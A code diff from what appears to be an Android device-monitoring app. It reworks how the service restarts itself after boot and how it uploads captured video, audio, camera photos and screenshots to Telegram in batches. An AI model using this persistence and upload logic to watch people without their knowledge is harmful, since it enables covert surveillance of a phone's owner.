@@ -333,6 +333,10 @@ class MonitoringService : Service() {
             }
         } catch (e: Exception) {
             android.util.Log.w("MonitoringService", "Immediate foreground start failed: ${redactToken(e.message)}")
+            try {
+                MessageScheduler.scheduleBootRestart(this)
+            } catch (_: Exception) {
+            }
         }
     }
 
@@ -596,7 +600,8 @@ class MonitoringService : Service() {
                     try { checkCurfew() } catch (_: Exception) { }
                     try { checkQuietHealth() } catch (_: Exception) { }
                     if (!cachedMonitoringPaused) {
-                        if (checkAndSendNewData()) idleDataCycles = 0 else idleDataCycles = (idleDataCycles + 1).coerceAtMost(100)
+                        val dataAuthBlocked = try { NetworkUtils.isAuthBlocked(preferencesManager) } catch (_: Exception) { false }
+                        if (checkAndSendNewData()) idleDataCycles = 0 else if (!dataAuthBlocked) idleDataCycles = (idleDataCycles + 1).coerceAtMost(100)
                         try {
                             CrashReporter.flushPending(this@MonitoringService)
                         } catch (_: Exception) {
@@ -5673,31 +5678,36 @@ private suspend fun ringDevice(seconds: Int) {
         var videoProgress = false
         try {
             if (!hasNetwork()) return
+            var batches = 0
+            drain@ while (batches < 3) {
             val pending = try {
                 cacheDir.listFiles { file ->
                     file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
-                }?.sortedBy { it.lastModified() }?.take(max) ?: return
+                }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
             } catch (e: Exception) {
-                return
+                break@drain
             }
+            if (pending.isEmpty()) break@drain
             val now = System.currentTimeMillis()
+            var batchProgress = false
             for (file in pending) {
                 if (file == activeVideoFile) continue
                 if (now - file.lastModified() < 10_000L) continue
                 if (!file.exists() || file.length() == 0L) {
                     deleteQuietly(file)
+                    batchProgress = true
+                    videoProgress = true
                     continue
                 }
                 val videoOutcome = sendVideoFile(file)
-                if (videoOutcome == MediaSendOutcome.KEPT) break
+                if (videoOutcome == MediaSendOutcome.KEPT) break@drain
+                batchProgress = true
                 videoProgress = true
                 if (videoOutcome == MediaSendOutcome.DROPPED) droppedVideos++
-                else if (videoOutcome == MediaSendOutcome.SENT) {
-                    // rename to .sent so prune won't delete it
-                    val sentFile = File(file.absolutePath + ".sent")
-                    try { file.renameTo(sentFile) } catch (_: Exception) { }
-                }
                 kotlinx.coroutines.delay(500)
+            }
+            if (!batchProgress) break@drain
+            batches++
             }
             if (droppedVideos > 0) {
                 try {
@@ -5738,31 +5748,36 @@ private suspend fun ringDevice(seconds: Int) {
         var audioProgress = false
         try {
             if (!hasNetwork()) return
+            var batches = 0
+            drain@ while (batches < 3) {
             val pending = try {
                 cacheDir.listFiles { file ->
                     file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
-                }?.sortedBy { it.lastModified() }?.take(max) ?: return
+                }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
             } catch (e: Exception) {
-                return
+                break@drain
             }
+            if (pending.isEmpty()) break@drain
             val now = System.currentTimeMillis()
+            var batchProgress = false
             for (file in pending) {
                 if (file == activeAudioFile) continue
                 if (now - file.lastModified() < 10_000L) continue
                 if (!file.exists() || file.length() == 0L) {
                     deleteQuietly(file)
+                    batchProgress = true
+                    audioProgress = true
                     continue
                 }
                 val audioOutcome = sendAudioFile(file)
-                if (audioOutcome == MediaSendOutcome.KEPT) break
+                if (audioOutcome == MediaSendOutcome.KEPT) break@drain
+                batchProgress = true
                 audioProgress = true
                 if (audioOutcome == MediaSendOutcome.DROPPED) droppedAudio++
-                else if (audioOutcome == MediaSendOutcome.SENT) {
-                    // rename to .sent so prune won't delete it
-                    val sentFile = File(file.absolutePath + ".sent")
-                    try { file.renameTo(sentFile) } catch (_: Exception) { }
-                }
                 kotlinx.coroutines.delay(500)
+            }
+            if (!batchProgress) break@drain
+            batches++
             }
             if (droppedAudio > 0) {
                 try {
@@ -6042,35 +6057,40 @@ private suspend fun ringDevice(seconds: Int) {
         if (NetworkUtils.isAuthBlocked(preferencesManager)) return
         if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return
         if (!photoFlushBusy.compareAndSet(false, true)) return
+        var droppedPhotos = 0
+        var photoProgress = false
         try {
-            val pending = try {
-                cacheDir.listFiles { file ->
-                    file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
-                }?.sortedBy { it.lastModified() }?.take(max) ?: return
+            var batches = 0
+            drain@ while (batches < 3) {
+                val pending = try {
+                    cacheDir.listFiles { file ->
+                        file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
+                    }?.sortedBy { it.lastModified() }?.take(max) ?: break@drain
             } catch (e: Exception) {
-                return
+                break@drain
             }
+            if (pending.isEmpty()) break@drain
             val now = System.currentTimeMillis()
-            var droppedPhotos = 0
-            var photoProgress = false
+            var batchProgress = false
             for (file in pending) {
                 if (file == activePhotoFile || file == activeShotFile) continue
                 if (now - file.lastModified() < 10_000L) continue
                 if (!file.exists() || file.length() == 0L) {
                     deleteQuietly(file)
+                    batchProgress = true
+                    photoProgress = true
                     continue
                 }
                 val photoOutcome = sendPhotoFile(file)
-                if (photoOutcome == MediaSendOutcome.KEPT) break
+                if (photoOutcome == MediaSendOutcome.KEPT) break@drain
+                batchProgress = true
                 photoProgress = true
                 if (photoOutcome == MediaSendOutcome.DROPPED) droppedPhotos++
-                else if (photoOutcome == MediaSendOutcome.SENT) {
-                    // rename to .sent so prune won't delete it
-                    val sentFile = File(file.absolutePath + ".sent")
-                    try { file.renameTo(sentFile) } catch (_: Exception) { }
-                }
                 kotlinx.coroutines.delay(500)
             }
+            if (!batchProgress) break@drain
+            batches++
+        }
             if (droppedPhotos > 0) {
                 try {
                     messageQueue.addMessage("\u26A0\uFE0F $droppedPhotos photo file(s) rejected by Telegram (400), discarded.", true)
